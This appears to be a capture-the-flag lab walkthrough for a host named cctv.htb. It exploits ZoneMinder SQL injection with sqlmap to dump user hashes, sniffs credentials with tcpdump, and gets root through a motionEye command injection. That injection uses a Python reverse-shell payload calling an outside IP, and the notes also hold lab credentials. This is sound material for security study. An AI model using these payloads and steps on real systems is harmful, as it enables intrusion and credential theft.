### Nmap
```
nmap -sV -sC -vv 10.129.8.150

---OUTPUT--
Nmap scan report for 10.129.8.150
Host is up, received echo-reply ttl 63 (0.017s latency).
Scanned at 2026-03-16 11:10:13 EDT for 39s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDZ15GCLPzC4gTM0nqzpUbr/2L77bM1C9sbBecivQPX/KcKvJrP88peCJXwTug7T/EORHr7M7JeHtMQJ6hYihFA=
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://cctv.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![[Pasted image 20260316111359.png]]
- Under staff login can login with admin credenetials `admin:admin`
![[Pasted image 20260316111508.png]]
![[Pasted image 20260316111523.png]]

- Looking at the version i see its 1.37.63
![[Pasted image 20260326115041.png]]

- Looking online I find it is vulnerable to sql injection : https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3

- I test and it works:
![[Pasted image 20260326115128.png]]

- Then using SQLmap I can get the requried info :
```
sqlmap -r test.req -p tid --batch --dbs  -threads=10

---RELEVANT-OUTPUT---
available databases [3]:
[*] information_schema
[*] performance_schema
[*] zm
```

- Then to grab the table names :
```
sqlmap -r test.req -p tid --batch --dbs  -threads=10 -D zm --tables

---RELEVANT-OUTPUT---
Database: zm
[43 tables]
+----------------------+
| Config               |
| ControlPresets       |
| Controls             |
| Devices              |
| Event_Data           |
| Event_Summaries      |
| Events_Archived      |
| Events_Day           |
| Events_Hour          |
| Events_Month         |
| Events_Tags          |
| Events_Week          |
| Filters              |
| Frames               |
| Groups_Monitors      |
| Groups_Permissions   |
| Manufacturers        |
| Maps                 |
| Models               |
| MonitorPresets       |
| Monitor_Status       |
| Monitors             |
| Monitors_Permissions |
| MontageLayouts       |
| Object_Types         |
| Reports              |
| Server_Stats         |
| Servers              |
| Sessions             |
| Snapshots            |
| Snapshots_Events     |
| States               |
| Stats                |
| Tags                 |
| TriggersX10          |
| User_Preferences     |
| Users                |
| ZonePresets          |
| Zones                |
| Events               |
| Groups               |
| Logs                 |
| Storage              |
+----------------------+
```
- Checking the Users table:
```
sqlmap -r test.req -p tid --batch --level 5 --risk 3 --dbs  -threads=10 -D zm -T Users --dump

---OUTPUT---
+----+---------+---------+---------+---------+---------+---------+----------+----------+--------------------------------------------------------------+------------+----------+----------+----------+----------+-----------+------------+------------+--------------+----------------+
| Id | Email   | Phone   | Name    | Control | Devices | Enabled | HomeView | Monitors | Password                                                     | Username   | Events   | Groups   | Stream   | System   | Snapshots | APIEnabled | Language   | MaxBandwidth | TokenMinExpiry |
+----+---------+---------+---------+---------+---------+---------+----------+----------+--------------------------------------------------------------+------------+----------+----------+----------+----------+-----------+------------+------------+--------------+----------------+
| 1  | <blank> | <blank> | <blank> | Edit    | Edit    | 1       | console  | Create   | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm | superadmin | Edit     | Edit     | View     | Edit     | Edit      | 1          | <blank>    | <blank>      | 0              |
| 2  | <blank> | <blank> | mark    | Edit    | Edit    | 1       | console  | Create   | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. | mark       | Edit     | Edit     | View     | View     | <blank>   | 1          | <blank>    | <blank>      | 0              |
| 3  | <blank> | <blank> | admin   | Edit    | Edit    | 1       | console  | Create   | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m | admin      | Edit     | Edit     | View     | View     | <blank>   | 1          | <blank>    | <blank>      | 0              |
+----+---------+---------+---------+---------+---------+---------+----------+----------+--------------------------------------------------------------+------------+----------+----------+----------+----------+-----------+------------+------------+--------------+----------------+
```
![[Pasted image 20260327054228.png]]

- The secvond and third hash gets cracked. The second one being a new hash :
	- Hash `$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.`
	- Cracked: `opensesame`
	- User : `mark`
- I  can ssh into target.
```
ssh mark@10.129.19.3
> opensesame
```

- Using ip a I see a lot of interfaces are open 
- Furthermore linpeas shows that we have some capabilities with tcpdump. With this I can find some credentials:
```
tcpdump -i any -nn -A tcp port 5000


---OUTPUT---
........USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=status

```
- Here port 5000 is used intentionally to search for Flask applications. Just good practice to check also considering the `ip a` output showing multiple interfaces and possible docker containers.
	- If we go through this way we can login to `sa_mike` and get user flag. Then we find a pdf which talks of reused credentials. Finally 8765 path is followed and we can use `sa_mike`'s credentials instead.


- Alternatively, checking open ports we see there are a few interesting ones. So I create a tunnel with logolo:

- One of the ports `8765` shows an interesting website
```
ssh -L8765:127.0.0.1:8765 mark@<ip>
> opensesame
```
- Then on browser goto `http://127.0.0.1:8765`
![[Pasted image 20260327073610.png]]
- Looking at my linpeas I see its an app running as root. furthermore I find credentials in `/etc/motioneye/motion.conf`
![[Pasted image 20260327073656.png]]
- With this command I find the location:
```
find / -iname "*motioneye*" 2>/dev/null

---RELEVANT-OUTPUT---
/etc/motioneye
/etc/motioneye/motioneye.conf
```
- Then in /etc/motioneye I find `motion.conf` holding credentials:
```
cat /etc/motioneye/motion.conf


---OUTPUT---
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @lang en
# @enabled on
# @normal_password 


setup_mode off
webcontrol_port 7999
webcontrol_interface 1
webcontrol_localhost on
webcontrol_parms 2

camera camera-1.conf

```
- Then I find an interesting site on `https://cctv.htb:8765` where i can login with these credentials and find the version of motion eye too
![[Pasted image 20260327074157.png]]
`4.7.1`

- Looking online I find a vulnerability https://github.com/motioneye-project/motioneye/security/advisories/GHSA-j945-qm58-4gjx
- Following the method I inject the following payload as the name :
```
$(python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.17.206",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")').%Y-%m-%d-%H-%M-%S
```
- I trigger a snapshot : 
```
curl "http://127.0.0.1:7999/1/action/snapshot"
```
- Or click the camera icon on the camera in the browser
- I grab a shell as root and can get user and root flag:
![[Pasted image 20260327090051.png]]
![[Pasted image 20260327090241.png]]

![[Pasted image 20260327090259.png]]


- metasploit also has an exploit to automate this quicker

- pdf file if we get sa_mark's creds first:
![[Pasted image 20260327090716.png]]
- credential reuse
- We can then login to the camera website with the credentials `admin:X1l9fx1ZjS7RZb`